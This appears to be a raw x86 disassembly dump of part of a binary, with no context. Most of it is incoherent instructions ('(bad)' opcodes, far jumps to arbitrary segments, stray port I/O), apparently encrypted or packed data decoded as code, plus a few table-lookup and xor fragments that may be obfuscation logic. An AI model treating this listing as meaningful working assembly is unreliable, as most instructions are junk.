  412bb1:	mov    ss,WORD PTR [esp+eiz*2-0x1a]
  412bb5:	push   DWORD PTR [edx+0x70068d42]
  412bbb:	loope  0x412b58
  412bbd:	inc    eax
  412bbe:	add    BYTE PTR [esi-0x49],bh
  412bc1:	push   esp
  412bc2:	mov    ebx,0x86a5237
  412bc7:	mov    ss,WORD PTR [ebx+0x63]
  412bca:	add    ecx,DWORD PTR [edx]
  412bcc:	dec    eax
  412bcd:	jb     0x412bc4
  412bcf:	call   0x4401:0x51b0eaa8
  412bd6:	xor    al,0xb9
  412bd9:	ficomp WORD PTR [eax]
  412bdb:	pop    esp
  412bdc:	cmp    eax,0xba1af12f
  412be1:	outs   dx,BYTE PTR ds:[esi]
  412be2:	call   0x98054aeb
  412be7:	xor    dh,BYTE PTR [ecx-0x18]
  412bea:	push   eax
  412beb:	mov    ebx,0xfdbf76d3
  412bf0:	and    al,0x58
  412bf2:	jbe    0x412bd5
  412bf4:	xor    DWORD PTR [esi+0x9],edx
  412bf7:	gs ins BYTE PTR es:[edi],dx
  412bf9:	arpl   WORD PTR [ecx+edx*4-0x45],cx
  412bfd:	sub    eax,0x913d3c0a
  412c02:	pop    edi
  412c03:	inc    bh
  412c05:	pop    ecx
  412c06:	xchg   ebx,eax
  412c07:	(bad)  [edi-0x4]
  412c0a:	aad    0xd9
  412c0c:	add    DWORD PTR [ebx],ebp
  412c0e:	adc    eax,0xc0552ce6
  412c13:	and    cl,ch
  412c15:	cld    
  412c16:	push   ss
  412c17:	retf   0xdf78
  412c1a:	pop    ecx
  412c1b:	dec    edx
  412c1c:	cld    
  412c1d:	and    eax,0xfc39285d
  412c22:	fld    QWORD PTR [edi+0x58]
  412c25:	push   ebx
  412c26:	jb     0x412c72
  412c28:	int3   
  412c29:	faddp  st(6),st
  412c2b:	inc    esp
  412c2c:	or     eax,0x84beabfd
  412c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c32:	cld    
  412c33:	addr16 std 
  412c35:	or     ebx,edx
  412c37:	push   DWORD PTR [edx+ebx*8+0x17c65f9d]
  412c3e:	sub    al,0x1b
  412c40:	push   edx
  412c41:	enter  0xbf4a,0x8b
  412c45:	mov    dh,dh
  412c47:	stos   DWORD PTR es:[edi],eax
  412c48:	retf   
  412c49:	mov    bh,0x7f
  412c4b:	jle    0x412c23
  412c4d:	in     al,dx
  412c4e:	(bad)  
  412c4f:	push   0xffffffe5
  412c51:	out    dx,al
  412c52:	into   
  412c53:	or     al,0xfe
  412c55:	mov    ah,0xf7
  412c57:	or     ecx,DWORD PTR [ecx]
  412c59:	fsub   DWORD PTR [ebx]
  412c5b:	pop    ebx
  412c5c:	jnp    0x412cdc
  412c5e:	cwde   
  412c5f:	xchg   edi,eax
  412c60:	lods   al,BYTE PTR ds:[esi]
  412c61:	jle    0x412be8
  412c63:	fbstp  TBYTE PTR [edi]
  412c65:	ss mov edi,DWORD PTR fs:[ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ebx-0x1a],ebp
  412c84:	mov    dl,0x21
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cfa
  412c8f:	mov    ecx,0x24803f70
  412c94:	cld    
  412c95:	add    DWORD PTR [ebx*1-0x2da7591e],eax
  412c9c:	xor    DWORD PTR [esi+0x2388ed8e],esp
  412ca2:	mov    dl,0x80
  412ca4:	mov    ds,WORD PTR ds:0x8fd1738b
  412caa:	cmp    ch,ch
  412cac:	gs cwde 
  412cae:	js     0x412cb4
  412cb0:	push   0xbe6220f2
  412cb5:	push   0xa099b755
  412cba:	stos   BYTE PTR es:[edi],al
  412cbb:	imul   ebp,ebx,0xaa421521
  412cc1:	pop    ebx
  412cc2:	ret    0x4a31
  412cc5:	aam    0xaf
  412cc7:	xchg   DWORD PTR [ecx+0x4c64210a],edx
  412ccd:	inc    ebp
  412cce:	adc    esp,DWORD PTR [eax+0x49]
  412cd1:	aaa    
  412cd2:	sbb    al,dh
  412cd4:	mov    al,ds:0x8930b7f1
  412cd9:	jnp    0x412c8a
  412cdb:	cld    
  412cdc:	out    dx,eax
  412cdd:	mov    ch,0x38
  412cdf:	dec    esp
  412ce0:	xchg   ebp,eax
  412ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce2:	idiv   BYTE PTR [edx-0x5879512a]
  412ce8:	rcl    DWORD PTR ds:0xbc47a761,0x77
  412cef:	gs aad 0xfa
  412cf2:	clc    
  412cf3:	sub    DWORD PTR [edx],esp
  412cf5:	cmp    esi,DWORD PTR [edx]
  412cf7:	pop    esi
  412cf8:	xchg   ebx,eax
  412cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cfa:	add    al,0x60
  412cfc:	pop    esp
  412cfd:	paddq  mm4,QWORD PTR [ebx-0xebe9ded]
  412d04:	xchg   ecx,eax
  412d05:	(bad)  
  412d06:	xchg   ebp,eax
  412d07:	push   ebp
  412d08:	outs   dx,BYTE PTR ds:[esi]
  412d09:	adc    eax,0x46ad651b
  412d0e:	push   eax
  412d0f:	push   ebx
  412d10:	stc    
  412d11:	xor    ah,ch
  412d13:	and    al,0x8a
  412d15:	out    0xf4,al
  412d17:	inc    eax
  412d18:	dec    ecx
  412d19:	hlt    
  412d1a:	adc    dl,ah
  412d1c:	cmp    edi,DWORD PTR [edi+0x47be0727]
  412d22:	int    0x2e
  412d24:	sti    
  412d25:	aad    0xf
  412d27:	jl     0x412d97
  412d29:	lods   al,BYTE PTR ds:[esi]
  412d2a:	mov    ds:0xca703a9c,eax
  412d2f:	and    DWORD PTR [esi+edx*8],ebx
  412d32:	cdq    
  412d33:	in     al,0x1d
  412d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d36:	cli    
  412d37:	push   ss
  412d38:	push   esi
  412d39:	dec    esi
  412d3a:	bound  ebp,QWORD PTR [ebp-0x19080923]
  412d40:	push   es
  412d41:	sub    BYTE PTR [ecx],dl
  412d43:	xchg   ecx,eax
  412d44:	jns    0x412d35
  412d46:	sbb    dl,BYTE PTR [ebx+0x42]
  412d49:	sbb    eax,0xcb39f0de
  412d4e:	pop    edx
  412d4f:	pop    ecx
  412d50:	test   BYTE PTR [ecx-0x4622e154],al
  412d56:	pop    edx
  412d57:	dec    esp
  412d58:	clc    
  412d59:	or     cl,bl
  412d5b:	int    0x71
  412d5d:	dec    eax
  412d5e:	add    eax,0xbfe67a73
  412d63:	pop    bp
  412d65:	popf   
  412d66:	and    eax,0xc834f4b1
  412d6b:	ja     0x412cf4
  412d6d:	stos   DWORD PTR es:[edi],eax
  412d6e:	jp     0x412db8
  412d70:	lods   al,BYTE PTR ds:[esi]
  412d71:	xchg   ecx,eax
  412d72:	pop    eax
  412d73:	pavgw  mm0,QWORD PTR [esi+0x29c241e2]
  412d7a:	stc    
  412d7b:	mov    al,ds:0xbf680179
  412d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d81:	call   0x657b38a3
  412d86:	das    
  412d87:	outs   dx,BYTE PTR ds:[esi]
  412d88:	and    eax,0xe0cbbe59
  412d8d:	or     eax,0xa8078483
  412d92:	sbb    al,0x2d
  412d94:	or     esi,edi
  412d96:	xor    eax,0xc8522345
  412d9b:	lahf   
  412d9c:	ja     0x412ddc
  412d9e:	jg     0x412d45
  412da0:	and    al,0xd3
  412da2:	xor    eax,0xbcae8043
  412da7:	sub    esi,DWORD PTR [esi-0x73]
  412daa:	xor    al,0xf7
  412dac:	adc    bl,BYTE PTR [esp]
  412daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db0:	dec    esi
  412db1:	dec    ecx
  412db2:	mov    al,ds:0x1f924b1f
  412db7:	mov    bh,0x30
  412db9:	sbb    ebp,DWORD PTR [esi+0x76]
  412dbc:	mov    ecx,0x7c48165e
  412dc1:	push   es
  412dc2:	jne    0x412d55
  412dc4:	xchg   BYTE PTR [ebp+0x60],cl
  412dc7:	jo     0x412de0
  412dc9:	cmp    al,0x75
  412dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dcc:	sbb    eax,0x1b711919
  412dd1:	pop    es
  412dd2:	xor    bh,bh
  412dd4:	test   BYTE PTR [esp+eiz*8],bh
  412dd7:	fisttp WORD PTR [edi+0x76e27d7c]
  412ddd:	and    ax,0x438e
  412de1:	in     al,0xc3
  412de3:	mov    ah,0xad
  412de5:	add    ecx,0x44
  412de8:	stos   BYTE PTR es:[edi],al
  412de9:	pusha  
  412dea:	fwait
  412deb:	mov    eax,ds:0x5cd2166c
  412df0:	sbb    DWORD PTR [esi],edx
  412df2:	adc    DWORD PTR ds:[ecx],esp
  412df5:	jmp    0x8612:0x29431afb
  412dfc:	js     0x412e06
  412dfe:	pop    es
  412dff:	mov    ch,BYTE PTR [eax]
  412e01:	in     al,dx
  412e02:	ja     0x412e58
  412e04:	(bad)  
  412e05:	mov    cl,0x7
  412e07:	aad    0x8d
  412e09:	xor    ch,dl
  412e0b:	icebp  
  412e0c:	push   esp
  412e0d:	aaa    
  412e0e:	mov    esp,0xc2f96754
  412e13:	pop    ss
  412e14:	jmp    0x938500b2
  412e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e1a:	mov    edi,0x521ebd68
  412e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e20:	ss dec esp
  412e22:	add    DWORD PTR [edx],esp
  412e24:	ins    DWORD PTR es:[edi],dx
  412e25:	jge    0x412e3e
  412e27:	cmp    BYTE PTR [eax],bl
  412e29:	nop
  412e2a:	call   0xf03b:0xba5ddc49
  412e31:	dec    eax
  412e32:	leave  
  412e33:	xchg   esp,eax
  412e34:	jo     0x412de2
  412e36:	pop    edi
  412e37:	fxch   st(3)
  412e39:	daa    
  412e3a:	xor    BYTE PTR [edi],dh
  412e3c:	fs push es
  412e3e:	push   0xffffffaf
  412e40:	xchg   ebp,eax
  412e41:	push   0xffffffdf
  412e43:	mov    ds:0xd6caf159,al
  412e48:	xchg   edi,eax
  412e49:	stos   DWORD PTR es:[edi],eax
  412e4a:	push   cs
  412e4b:	xchg   DWORD PTR [edi-0x1a],ebp
  412e4e:	mov    eax,ds:0x5e204737
  412e53:	out    dx,al
  412e54:	repz add dl,BYTE PTR [edx]
  412e57:	push   cs
  412e58:	test   al,0x27
  412e5a:	sub    al,0x9
  412e5c:	cmp    cl,BYTE PTR [eax+esi*8-0x9]
  412e60:	dec    eax
  412e61:	fwait
  412e62:	inc    ecx
  412e63:	mov    ds,WORD PTR [edx]
  412e65:	je     0x412ea5
  412e67:	pushf  
  412e68:	jbe    0x412df9
  412e6a:	je     0x412e8c
  412e6c:	jno    0x412e6a
  412e6e:	push   0x37e5c3a5
  412e73:	lea    ebx,[ebx-0x1ca88823]
  412e79:	bound  ebx,QWORD PTR [eax+ecx*4]
  412e7c:	add    eax,0xa1900756
  412e81:	dec    edx
  412e82:	repz stc 
  412e84:	cs mov edx,0x6fbce32
  412e8a:	or     eax,0xb4e8d1f6
  412e8f:	repz push edx
  412e91:	test   eax,0x2bee7d32
  412e96:	inc    esi
  412e97:	cli    
  412e98:	sub    DWORD PTR [edi],esp
  412e9a:	and    BYTE PTR [edi+0x7e8ee5b8],al
  412ea0:	ds or  eax,0x19bd2556
  412ea6:	jmp    0x412e47
  412ea8:	push   es
  412ea9:	xor    BYTE PTR [ecx+0xd],ch
  412eac:	das    
  412ead:	xchg   ecx,eax
  412eae:	inc    edi
  412eaf:	imul   esp,DWORD PTR [esi],0xf
  412eb2:	nop
  412eb3:	out    0x1f,al
  412eb5:	fsub   DWORD PTR [ebx-0x6ac42268]
  412ebb:	dec    edx
  412ebc:	in     eax,dx
  412ebd:	data16 test al,0xaa
  412ec0:	inc    esp
  412ec1:	xchg   edi,eax
  412ec2:	or     bh,BYTE PTR [esi-0x3028985f]
  412ec8:	loop   0x412e71
  412eca:	mov    ebx,0x5c8653a
  412ecf:	and    edi,DWORD PTR [edi]
  412ed1:	inc    edx
  412ed2:	push   sp
  412ed4:	jmp    esp
  412ed6:	pop    edi
  412ed7:	into   
  412ed8:	int3   
  412ed9:	mov    cl,0x80
  412edb:	push   ecx
  412edc:	dec    ebp
  412edd:	mov    esp,ss
  412edf:	push   ebp
  412ee0:	fsub   QWORD PTR [ecx-0x7d91997d]
  412ee6:	jne    0x412f32
  412ee8:	and    ch,al
  412eea:	(bad)  
  412eeb:	addr16 push 0x3c345fd7
  412ef1:	xlat   BYTE PTR ds:[ebx]
  412ef2:	jge    0x412edd
  412ef4:	mov    edx,0xa97c8b2c
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x3a
  412f26:	jmp    0x7878:0x7569915d
  412f2d:	in     eax,0x7e
  412f2f:	js     0x412fa9
  412f31:	push   eax
  412f32:	call   0x77a4:0xd3f4cd91
  412f39:	lods   al,BYTE PTR ds:[esi]
  412f3a:	inc    eax
  412f3b:	mov    cl,0x1f
  412f3d:	les    edx,FWORD PTR ds:0x7c46e9f2
  412f43:	jb     0x412f43
  412f45:	loope  0x412ed6
  412f47:	and    BYTE PTR [ebx+0x756ca895],ah
  412f4d:	xchg   esi,eax
  412f4e:	psubusb mm6,QWORD PTR [ecx+0x7d]
  412f52:	daa    
  412f53:	(bad)  
  412f54:	in     al,0xc5
  412f56:	sub    DWORD PTR [esi],ebx
  412f58:	repz jne 0x412efd
  412f5b:	jnp    0x412ee4
  412f5d:	lds    esp,FWORD PTR [eax+0x76]
  412f60:	fild   QWORD PTR [esi]
  412f62:	dec    esp
  412f63:	fs pop esp
  412f65:	inc    ebp
  412f66:	fidivr DWORD PTR [edx+eax*1]
  412f69:	dec    ebx
  412f6a:	mov    eax,ds:0x34e93967
  412f6f:	ds in  eax,dx
  412f71:	xchg   DWORD PTR [eax],edi
  412f73:	popw   ss
  412f75:	and    al,0x75
  412f77:	cmp    ch,cl
  412f79:	push   0x55f3d577
  412f7e:	call   0x7744:0xae00e3c5
  412f85:	xor    ecx,DWORD PTR ds:0x26fe3398
  412f8b:	gs iret 
  412f8d:	pop    esp
  412f8e:	test   BYTE PTR [edi],al
  412f90:	push   es
  412f91:	sti    
  412f92:	loop   0x412f66
  412f94:	scas   al,BYTE PTR es:[edi]
  412f95:	ror    ah,1
  412f97:	dec    eax
  412f98:	cmc    
  412f99:	cmc    
  412f9a:	ss pop edi
  412f9c:	lods   al,BYTE PTR ds:[esi]
  412f9d:	out    dx,eax
  412f9e:	ins    DWORD PTR es:[edi],dx
  412f9f:	mov    dl,0x78
  412fa1:	jo     0x412f9e
  412fa3:	pop    edi
  412fa4:	jmp    0x26f9:0x5f2a68f1
  412fab:	push   es
  412fac:	iret   
  412fad:	jno    0x412fce
  412faf:	mov    ds:0x1b700a6d,eax
  412fb4:	cmp    DWORD PTR [edi],edi
  412fb6:	sub    eax,0x87fc4c69
  412fbb:	push   ss
  412fbc:	ins    BYTE PTR es:[edi],dx
  412fbd:	dec    eax
  412fbe:	adc    DWORD PTR [edx+0x42931b56],eax
  412fc4:	jmp    0x412ff8
  412fc6:	jae    0x413002
  412fc8:	or     BYTE PTR [eax],al
  412fca:	adc    DWORD PTR [edx+edx*2],esi
  412fcd:	stc    
  412fce:	(bad)  
  412fcf:	lods   al,BYTE PTR ds:[esi]
  412fd0:	sbb    al,0x6c
  412fd2:	pop    ebx
  412fd3:	jmp    0x412f5e
  412fd5:	stos   DWORD PTR es:[edi],eax
  412fd6:	cli    
  412fd7:	scas   al,BYTE PTR es:[edi]
  412fd8:	inc    esp
  412fd9:	into   
  412fda:	scas   eax,DWORD PTR es:[edi]
  412fdb:	retf   0x3a30
  412fde:	mov    edi,0xf6624a49
  412fe3:	jns    0x412fe7
  412fe5:	dec    ebx
  412fe6:	xchg   BYTE PTR [ecx],ch
  412fe8:	adc    edi,DWORD PTR [eax]
  412fea:	add    DWORD PTR [ecx],eax
  412fec:	adc    DWORD PTR [eax+edi*1],ecx
  412fef:	mul    DWORD PTR [edx+0x6d]
  412ff2:	jl     0x41303c
  412ff4:	cmp    DWORD PTR [ecx-0x62],0xffffff80
  412ff8:	mov    bl,0x3b
  412ffa:	sti    
  412ffb:	or     DWORD PTR [eax-0x5c],esi
  412ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fff:	mov    eax,0xd7242082
  413004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413005:	pop    edx
  413006:	(bad)  
  413007:	mov    al,0x5c
  413009:	adc    cl,ah
  41300b:	pop    ds
  41300c:	jb     0x412fba
  41300e:	dec    DWORD PTR [ecx+0x44b6547]
  413014:	inc    esi
  413015:	add    eax,0x617ddaab
  41301a:	(bad)  
  41301b:	dec    ecx
  41301c:	jle    0x412fa4
  41301e:	jns    0x413092
  413020:	sbb    DWORD PTR [ecx+esi*2],esp
  413023:	mov    bl,0x3c
  413025:	mov    al,0xda
  413027:	ss cmp al,0xb2
  41302a:	mov    ds:0x15fe0ca0,al
  41302f:	cmp    DWORD PTR [ecx-0x4eecfc23],ebx
  413035:	inc    eax
  413036:	adc    edx,ebx
  413038:	jmp    FWORD PTR [ebp+0x36]
  41303b:	scas   eax,DWORD PTR es:[edi]
  41303c:	xchg   edi,eax
  41303d:	mov    bl,BYTE PTR [edi]
  41303f:	icebp  
  413040:	sbb    BYTE PTR [ecx+0x41],bl
  413043:	pop    edi
  413044:	mov    gs,esi
  413046:	xchg   edx,eax
  413047:	jo     0x41307c
  413049:	push   ss
  41304a:	ins    DWORD PTR es:[edi],dx
  41304b:	adc    ebp,eax
  41304d:	sbb    al,0x6b
  41304f:	loop   0x412fec
  413051:	and    eax,0x9d6983d1
  413056:	xor    al,0x4a
  413058:	into   
  413059:	mov    BYTE PTR [edx],ah
  41305b:	fidivr DWORD PTR [esi]
  41305d:	adc    ebp,DWORD PTR [edi-0xdfbcbc2]
  413063:	cmp    eax,0xf0068622
  413068:	pop    ss
  413069:	xchg   ebx,eax
  41306a:	fnsave [edi-0x2c]
  41306d:	in     al,0x65
  41306f:	popa   
  413070:	push   0x4c
  413072:	aad    0xa4
  413074:	or     eax,0xd6d30041
  413079:	lods   eax,DWORD PTR ds:[esi]
  41307a:	imul   ebx,DWORD PTR [edi-0x6667e227],0xfa223d00
  413084:	jl     0x413092
  413086:	dec    DWORD PTR [esi]
  413088:	xchg   ebp,eax
  413089:	jg     0x41301b
  41308b:	adc    eax,0xda1c2894
  413090:	mov    dh,0xfe
  413092:	ret    0x421f
  413095:	pop    eax
  413096:	add    DWORD PTR [ebx-0x143c56c5],edi
  41309c:	fcomip st,st(4)
  41309e:	cmp    ebx,DWORD PTR [eax+0x54]
  4130a1:	sbb    eax,0xd99ef8b9
  4130a6:	pop    ds
  4130a7:	stos   DWORD PTR es:[edi],eax
  4130a8:	into   
  4130a9:	and    DWORD PTR gs:[eax],edi
  4130ac:	pop    eax
  4130ad:	es js  0x413074
  4130b0:	dec    esi
  4130b1:	sbb    DWORD PTR [ebx+0x3a],ebp
  4130b4:	cmc    
  4130b5:	cmp    eax,0x4339e559
  4130ba:	cmp    ebx,DWORD PTR [edi-0x27e152df]
  4130c0:	icebp  
  4130c1:	mov    esp,DWORD PTR [eax-0x308c6609]
  4130c7:	call   0xa4b63822
  4130cc:	or     BYTE PTR [ecx-0x52],ah
  4130cf:	inc    ecx
  4130d0:	pop    ss
  4130d1:	sbb    DWORD PTR [ebx],esp
  4130d3:	lods   eax,DWORD PTR ds:[esi]
  4130d4:	lods   eax,DWORD PTR ds:[esi]
  4130d5:	scas   al,BYTE PTR es:[edi]
  4130d6:	ins    BYTE PTR es:[edi],dx
  4130d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d8:	fisttp WORD PTR [ecx]
  4130da:	fcom   QWORD PTR [ebx]
  4130dc:	jne    0x41309c
  4130de:	imul   DWORD PTR [edi-0xa8b2d1a]
  4130e4:	pop    ds
  4130e5:	in     eax,dx
  4130e6:	mov    DWORD PTR [edi-0x7abf5170],esp
  4130ec:	mov    ebp,0xd15246cf
  4130f1:	(bad)  
  4130f2:	imul   ebp,DWORD PTR [ecx],0xfffffffd
  4130f5:	pop    esi
  4130f6:	sub    ebp,DWORD PTR [eax-0x7186f5c2]
  4130fc:	jae    0x4130d7
  4130fe:	mov    ah,0xcd
  413100:	mov    bh,BYTE PTR [ebx-0x576bbe17]
  413106:	lock cld 
  413108:	lods   eax,DWORD PTR ds:[esi]
  413109:	mov    eax,ds:0xa48ec8b1
  41310e:	cli    
  41310f:	imul   edx,DWORD PTR [ebx],0xc41d44b2
  413115:	xor    BYTE PTR [eax],dh
  413117:	call   0x9bc8:0x4cd68977
  41311e:	lods   eax,DWORD PTR ds:[esi]
  41311f:	scas   al,BYTE PTR es:[edi]
  413120:	push   ss
  413121:	mov    edx,0xcd5b7e40
  413126:	sub    al,0x6
  413128:	pop    esp
  413129:	pop    ebp
  41312a:	dec    edx
  41312b:	sbb    DWORD PTR [esi-0x35],ebx
  41312e:	repnz loopne 0x413177
  413131:	jp     0x413137
  413133:	jecxz  0x413129
  413135:	stc    
  413136:	sbb    eax,0x87a5ad00
  41313b:	add    ah,cl
  41313d:	fldenv [ecx-0x233e7e63]
  413143:	lock mov ds:0xdb383b97,eax
  413149:	and    DWORD PTR [edi+0x6f2081f9],0x8b40795d
  413153:	rcr    BYTE PTR [ebp+0x24],cl
  413156:	and    BYTE PTR [ebx+0x4d],0xc2
  41315a:	gs clc 
  41315c:	jb     0x413149
  41315e:	shr    esp,0x62
  413161:	adc    al,0x4e
  413163:	ins    DWORD PTR es:[edi],dx
  413164:	sub    ecx,ecx
  413166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413167:	std    
  413168:	sar    dh,1
  41316a:	fsub   st,st(2)
  41316c:	jl     0x413101
  41316e:	or     ch,BYTE PTR [ecx-0x305912dc]
  413174:	repz inc esp
  413176:	jp     0x4131bd
  413178:	and    edi,edx
  41317a:	stos   DWORD PTR es:[edi],eax
  41317b:	dec    esp
  41317c:	rcl    BYTE PTR [ebx+0x33],0x4a
  413180:	retf   0xb678
  413183:	aas    
  413184:	pop    ebp
  413185:	mov    DWORD PTR [ecx-0x2048f51e],edx
  41318b:	xor    eax,DWORD PTR [ebx]
  41318d:	test   DWORD PTR [ecx+0x2a4c6e35],0x12085fff
  413197:	pop    ebp
  413198:	bound  edx,QWORD PTR [ebx+0x7d8bdd64]
  41319e:	hlt    
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	xorps  xmm4,xmm5
  4131ca:	std    
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x413189
  4131d4:	outs   dx,DWORD PTR ds:[esi]
  4131d5:	pop    ecx
  4131d6:	mov    ebp,0x8191517f
  4131db:	in     eax,dx
  4131dc:	call   0xb5e6ff74
  4131e1:	inc    ebx
  4131e2:	xor    edx,edx
  4131e4:	dec    edi
  4131e5:	es out 0x8b,eax
  4131e8:	mov    eax,DWORD PTR [eax+0x3b3145b6]
  4131ee:	jmp    0x68517840
  4131f3:	aad    0xc7
  4131f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131f6:	pop    esp
  4131f7:	jne    0x413182
  4131f9:	xchg   ebx,eax
  4131fa:	mov    edi,DWORD PTR [ebx-0x67]
  4131fd:	jmp    0x4131a7
  4131ff:	sbb    eax,esp
  413201:	cmp    DWORD PTR [ebp-0x5447114e],0x4f
  413208:	pop    ebp
  413209:	aam    0x51
  41320b:	cmc    
  41320c:	xor    ebx,ebp
  41320e:	xor    cl,BYTE PTR [ebx+ebx*4+0x4a76fe91]
  413215:	jmp    0x413229
  413217:	mov    ah,0x7d
  413219:	pop    es
  41321a:	and    DWORD PTR [ebp-0x33],0xbb329cd4
  413221:	out    0x81,al
  413223:	sar    DWORD PTR [edi],1
  413225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413226:	pusha  
  413227:	jae    0x4132a2
  413229:	cmp    BYTE PTR [esi-0x2658833c],dh
  41322f:	fidiv  WORD PTR [esi+0x3f]
  413232:	sti    
  413233:	in     eax,0x92
  413235:	cwde   
  413236:	sub    al,0xde
  413238:	inc    edi
  413239:	lods   al,BYTE PTR ds:[esi]
  41323a:	scas   al,BYTE PTR es:[edi]
  41323b:	xchg   ecx,eax
  41323c:	xchg   ah,bl
  41323e:	repz mov es,WORD PTR es:[eax+ebp*2+0x177acb4f]
  413247:	jbe    0x4131d9
  413249:	pop    ecx
  41324a:	push   0x19328682
  41324f:	xor    al,0xe5
  413251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413252:	mov    eax,0x475ae174
  413257:	cli    
  413258:	fist   DWORD PTR [ebx]
  41325a:	sub    eax,0x1c637849
  41325f:	adc    cl,BYTE PTR [ebp+ecx*1+0x5d]
  413263:	(bad)  
  413264:	rcr    DWORD PTR [esi-0x7f],1
  413267:	pop    ebx
  413268:	in     eax,0x6a
  41326a:	sbb    dl,cl
  41326c:	into   
  41326d:	xor    bl,BYTE PTR ds:0xa4331a2a
  413273:	(bad)  
  413274:	leave  
  413275:	idiv   BYTE PTR [ebx+edi*1]
  413278:	je     0x41325e
  41327a:	add    bh,BYTE PTR fs:[ebp-0x544d893b]
  413281:	dec    ebx
  413282:	or     al,0xf2
  413284:	mov    ah,0x22
  413286:	pop    esp
  413287:	jo     0x4132c8
  413289:	mov    edx,0xbed3571d
  41328e:	inc    ebp
  41328f:	mov    cl,0xfa
  413291:	mov    DWORD PTR [eax],esi
  413293:	sbb    BYTE PTR [esi+0x3],ah
  413296:	cmp    DWORD PTR [ebx+0x7649a728],eax
  41329c:	or     eax,0x18197b1d
  4132a1:	dec    ebx
  4132a2:	xchg   ecx,eax
  4132a3:	test   esp,ebx
  4132a5:	outs   dx,DWORD PTR ds:[esi]
  4132a6:	imul   edi,DWORD PTR [ebx],0x28
  4132a9:	ret    
  4132aa:	bound  edx,QWORD PTR [ebp+0x5682375c]
  4132b0:	je     0x4132a5
  4132b2:	(bad)  
  4132b4:	jae    0x413317
  4132b6:	cmp    ebp,DWORD PTR [ebx+0x60]
  4132b9:	inc    ebp
  4132ba:	mov    WORD PTR [eax],fs
  4132bc:	sbb    ecx,DWORD PTR [esi-0x1da3a4d7]
  4132c2:	add    esi,edi
  4132c4:	mov    bl,0x89
  4132c6:	das    
  4132c7:	sar    ah,1
  4132c9:	or     bh,BYTE PTR [edx+0x32376b55]
  4132cf:	retf   0x4e56
  4132d2:	xor    ah,dl
  4132d4:	inc    ebp
  4132d5:	jns    0x413267
  4132d7:	retf   0xb9ea
  4132da:	dec    esi
  4132db:	into   
  4132dc:	mov    ah,0x27
  4132de:	sub    dh,ah
  4132e0:	and    cl,BYTE PTR [esi+0x4c7c2f6f]
  4132e6:	pop    ebp
  4132e7:	mov    ds,WORD PTR [edx+0x7f6fac60]
  4132ed:	dec    ebp
  4132ee:	fsub   QWORD PTR [ebx]
  4132f0:	ret    0xadbc
  4132f3:	lods   al,BYTE PTR ds:[esi]
  4132f4:	std    
  4132f5:	rcl    BYTE PTR [eax-0x43],0x53
  4132f9:	ins    DWORD PTR es:[edi],dx
  4132fa:	push   edi
  4132fb:	ja     0x4132f1
  4132fd:	cmp    cl,al
  4132ff:	loope  0x413324
  413301:	mov    ds:0x5c4e9da3,eax
  413306:	push   0x5b564402
  41330b:	mov    dh,0x25
  41330d:	scas   al,BYTE PTR es:[edi]
  41330e:	mul    DWORD PTR [eax+ecx*4-0x5d]
  413312:	stos   DWORD PTR es:[edi],eax
  413313:	fdiv   st,st(1)
  413315:	cmp    ebp,DWORD PTR [edx-0x65]
  413318:	out    dx,al
  413319:	call   0x5045:0xf1cff211
  413320:	push   0xffffffa0
  413322:	sbb    BYTE PTR [edi-0x5e5ed493],bl
  413328:	or     dl,dh
  41332a:	dec    ebx
  41332b:	pop    edi
  41332c:	pop    ecx
  41332d:	mov    ds:0xc6b27e41,eax
  413332:	(bad)  
  413333:	cmp    esp,DWORD PTR [eax]
  413335:	addr16 push 0xab10140
  41333b:	in     eax,0x69
  41333d:	jo     0x4132cf
  41333f:	ret    
  413340:	pusha  
  413341:	loope  0x4132c3
  413343:	xchg   BYTE PTR [esi+0x6d],cl
  413346:	imul   eax,DWORD PTR [eax-0x24],0xffffffd1
